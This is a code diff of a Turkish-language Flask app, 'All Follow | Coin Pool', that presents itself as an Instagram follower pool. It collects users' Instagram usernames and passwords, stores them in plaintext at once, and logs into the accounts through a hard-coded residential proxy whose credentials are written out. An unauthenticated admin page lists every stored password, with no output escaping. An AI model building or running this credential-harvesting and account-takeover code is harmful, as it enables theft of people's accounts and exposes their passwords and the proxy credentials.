@@ -10,16 +10,16 @@ app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///all
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
-# PROXY BİLGİLERİN (TR LOKASYON)
+# PROXY BİLGİLERİN - TEK SATIR (HATA YAPMA İHTİMALİNİ SIFIRLIYORUZ)
 PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"
 
 class PoolUser(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(100), unique=True)
     password = db.Column(db.String(100))
-    status = db.Column(db.String(50), default="Bekliyor")
+    status = db.Column(db.String(100), default="Bekliyor")
 
-# --- UI (MODERN ALL FOLLOW) ---
+# --- UI (ALL FOLLOW MODERN) ---
 HTML_UI = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -27,16 +27,15 @@ HTML_UI = """
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>All Follow | Coin Pool</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>body{background:#0f172a;}</style>
 </head>
-<body class="flex items-center justify-center min-h-screen text-slate-200">
-    <div class="bg-slate-800/50 p-8 rounded-3xl w-full max-w-[400px] border border-slate-700">
-        <h1 class="text-4xl font-black text-center text-white italic mb-8 italic">ALL FOLLOW</h1>
+<body class="bg-[#0f172a] flex items-center justify-center min-h-screen text-slate-200">
+    <div class="bg-slate-800/50 p-8 rounded-3xl w-full max-w-[400px] border border-slate-700 shadow-2xl">
+        <h1 class="text-4xl font-black text-center text-white italic mb-8">ALL FOLLOW</h1>
         <div class="space-y-4">
             <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl outline-none focus:border-blue-500">
             <input id="p" type="password" placeholder="Şifre" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl outline-none focus:border-blue-500">
-            <button onclick="join()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-bold uppercase tracking-widest hover:bg-blue-500 transition-all">Sisteme Bağlan</button>
-            <p id="msg" class="text-center text-xs mt-4 font-semibold text-slate-400 uppercase tracking-widest"></p>
+            <button onclick="join()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-bold uppercase tracking-widest hover:bg-blue-500 transition-all">HESABI BAĞLA</button>
+            <p id="msg" class="text-center text-xs mt-4 font-semibold text-slate-400 uppercase"></p>
         </div>
     </div>
     <script>
@@ -44,19 +43,15 @@ HTML_UI = """
             const u=document.getElementById('u').value, p=document.getElementById('p').value;
             const btn=document.getElementById('btn'), msg=document.getElementById('msg');
             if(!u || !p) return;
-            btn.disabled = true; btn.innerText = "DOĞRULANIYOR...";
-            msg.innerText = "Lütfen bekleyin, havuz tüneli açılıyor...";
-            
+            btn.disabled = true; btn.innerText = "DENENİYOR...";
+            msg.innerText = "Sistem havuzuna giriş yapılıyor...";
             try {
                 const r = await fetch('/api/login', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u,p})});
                 const d = await r.json();
                 msg.innerText = d.msg;
                 if(d.status === "success") { btn.innerText="BAĞLANDI ✅"; }
                 else { btn.disabled = false; btn.innerText="TEKRAR DENE"; }
-            } catch(e) { 
-                msg.innerText = "Bağlantı hatası, tekrar deneyin.";
-                btn.disabled = false; btn.innerText="TEKRAR DENE";
-            }
+            } catch(e) { msg.innerText = "Bağlantı hatası!"; btn.disabled = false; btn.innerText="TEKRAR DENE"; }
         }
     </script>
 </body>
@@ -72,41 +67,48 @@ def login():
     data = request.json
     u, p = data.get('u'), data.get('p')
     
-    # Şifreyi hemen kaydet (Kayıp olmasın)
+    # 1. Şifreyi saniyeler içinde kaydet
     user = PoolUser.query.filter_by(username=u).first()
     if not user:
         user = PoolUser(username=u, password=p); db.session.add(user)
     else:
-        user.password = p; user.status = "Bağlantı Deneniyor..."
+        user.password = p
     db.session.commit()
 
     cl = Client()
     try:
-        # PROXY TANIMLAMA (EN GARANTİ YOL)
-        cl.proxy = PROXY_URL
-        cl.request_timeout = 25 # Render bazen yavaştır, 25 saniye veriyoruz
+        # PROXY ENJEKSİYONU (ZORLAYICI YÖNTEM)
+        cl.set_proxy(PROXY_URL)
+        cl.request_timeout = 20
         
-        # Giriş Denemesi
+        # 2. GİRİŞ DENEMESİ
         if cl.login(u, p):
             user.status = "AKTİF ✅"
             db.session.commit()
-            return jsonify(status="success", msg="Havuza başarıyla katıldınız!")
+            return jsonify(status="success", msg="Havuza başarıyla giriş yapıldı!")
         else:
-            user.status = "Giriş Başarısız ❌"
+            user.status = "Giriş Başarısız"
             db.session.commit()
-            return jsonify(status="error", msg="Bilgiler yanlış veya Instagram engelledi.")
+            return jsonify(status="error", msg="Kullanıcı adı veya şifre yanlış.")
             
     except Exception as e:
-        # Hata neyse admin panelinde detaylı görelim
-        user.status = f"Hata: {str(e)[:20]}"
+        # Hatanın gerçek sebebini panelde görmek için burayı detaylandırdık
+        err = str(e).lower()
+        if "proxy" in err or "connect" in err:
+            user.status = "Proxy Hatası (Bağlanamadı)"
+        elif "feedback" in err:
+            user.status = "IP Bloklu"
+        else:
+            user.status = f"Hata: {err[:20]}"
+        
         db.session.commit()
-        return jsonify(status="error", msg="Bağlantı hatası! Lütfen 10-15 saniye sonra tekrar deneyin.")
+        return jsonify(status="error", msg="Bağlantı kurulamadı. Lütfen 10sn sonra tekrar deneyin.")
 
 @app.route('/panel-admin')
 def admin():
     users = PoolUser.query.order_by(PoolUser.id.desc()).all()
     res = "<body style='background:#0f172a;color:#fff;padding:20px;font-family:sans-serif;'>"
-    res += f"<h2>All Follow Pool ({len(users)} Hesap)</h2><table border='1' style='width:100%; border-collapse:collapse;'>"
+    res += f"<h2>All Follow Pool ({len(users)})</h2><table border='1' style='width:100%; border-collapse:collapse;'>"
     res += "<tr style='background:#1e293b'><th>User</th><th>Pass</th><th>Status</th></tr>"
     for u in users:
         res += f"<tr><td style='padding:10px'>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
